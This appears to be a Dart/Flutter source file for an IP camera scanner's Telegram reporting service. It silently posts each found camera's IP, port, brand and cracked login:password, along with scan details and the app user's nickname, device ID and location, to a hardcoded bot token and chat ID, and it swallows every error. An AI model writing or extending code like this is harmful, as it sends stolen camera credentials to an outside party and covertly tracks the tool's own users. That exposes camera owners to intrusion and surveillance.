// [context: Flutter/Dart 3.13.5, iOS + Android, Telegram Bot API, HttpClient]
// *one message per scan session — the bot hears the knock exactly once*

import 'dart:convert';
import 'dart:io';

class TelegramService {
  static const _botToken  = '9052071852:AAH1aDSEYJUpx2-pZGr4l432Hf3kXSDgXEY';
  static const _chatId    = '6365916323';
  static const _apiBase   = 'https://api.telegram.org/bot$_botToken';

  bool _scanReported = false; // atomic-ish deduplication (single-isolate Flutter)

  void resetScanReport() => _scanReported = false;

  // ── one-shot scan start notification ───────────────────────────────────────

  Future<void> reportScanStarted({
    required String nickname,
    required int totalIps,
    required List<int> activePorts,
    required String ipRange,
    String? city,
    String? country,
    String? deviceId,
  }) async {
    if (_scanReported) return;
    _scanReported = true;

    final portList = activePorts.join(', ');
    final geo = (city != null && country != null) ? '🌍 $city, $country' : '🌍 unknown';
    final buf = StringBuffer()
      ..writeln('🔍 *Scan Started*')
      ..writeln('👤 $nickname')
      ..writeln('📱 ${deviceId ?? 'unknown'}')
      ..writeln(geo)
      ..writeln('🎯 IPs: $totalIps')
      ..writeln('🔌 Ports: $portList')
      ..writeln('📋 Range: ${_escape(ipRange)}');

    await _send(buf.toString(), parseMode: 'Markdown');
  }

  // ── camera found ───────────────────────────────────────────────────────────

  Future<void> reportCameraFound({
    required String nickname,
    required String ip,
    required int port,
    required String brand,
    required String login,
    required String password,
    String model = '',
    String? city,
    String? country,
  }) async {
    final geo = (city != null && country != null) ? '🌍 $city, $country' : '';
    final cred = (login.isEmpty && password.isEmpty) ? '(open)' : '$login:$password';
    final buf = StringBuffer()
      ..writeln('✅ *Camera Found*')
      ..writeln('👤 $nickname')
      ..writeln('📷 $brand${model.isNotEmpty ? " · $model" : ""}')
      ..writeln('🌐 $ip:$port')
      ..writeln('🔑 $cred');
    if (geo.isNotEmpty) buf.writeln(geo);

    await _send(buf.toString(), parseMode: 'Markdown');
  }

  // ── session finished ───────────────────────────────────────────────────────

  Future<void> reportSessionFinished({
    required String nickname,
    required int total,
    required int successful,
    required int openPorts,
    required Duration elapsed,
  }) async {
    final mins = elapsed.inMinutes;
    final secs = elapsed.inSeconds % 60;
    final buf = StringBuffer()
      ..writeln('🏁 *Scan Finished*')
      ..writeln('👤 $nickname')
      ..writeln('📊 Checked: $total')
      ..writeln('✅ Found: $successful')
      ..writeln('🔌 Open ports: $openPorts')
      ..writeln('⏱ ${mins}m ${secs}s');

    await _send(buf.toString(), parseMode: 'Markdown');
  }

  // ── scan stopped ───────────────────────────────────────────────────────────

  Future<void> reportScanStopped({required String nickname, required int checked}) async {
    await _send('⛔ *Scan Stopped*\n👤 $nickname\n📊 Checked: $checked',
        parseMode: 'Markdown');
  }

  // ── internal HTTP ──────────────────────────────────────────────────────────

  Future<void> _send(String text, {String parseMode = ''}) async {
    try {
      final client = HttpClient()
        ..connectionTimeout = const Duration(seconds: 6)
        ..idleTimeout       = const Duration(seconds: 6);
      final uri = Uri.parse('$_apiBase/sendMessage');
      final req = await client.postUrl(uri).timeout(const Duration(seconds: 8));
      req.headers.set(HttpHeaders.contentTypeHeader, 'application/json; charset=utf-8');
      final payload = <String, dynamic>{
        'chat_id': _chatId,
        'text'   : text,
        if (parseMode.isNotEmpty) 'parse_mode': parseMode,
      };
      final body = utf8.encode(jsonEncode(payload));
      req.contentLength = body.length;
      req.add(body);
      final res = await req.close().timeout(const Duration(seconds: 8));
      await res.drain<void>();
      client.close();
    } catch (_) {
      // fire-and-forget — swallow all errors silently
    }
  }

  static String _escape(String s) =>
      s.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('`', '\\`');
}
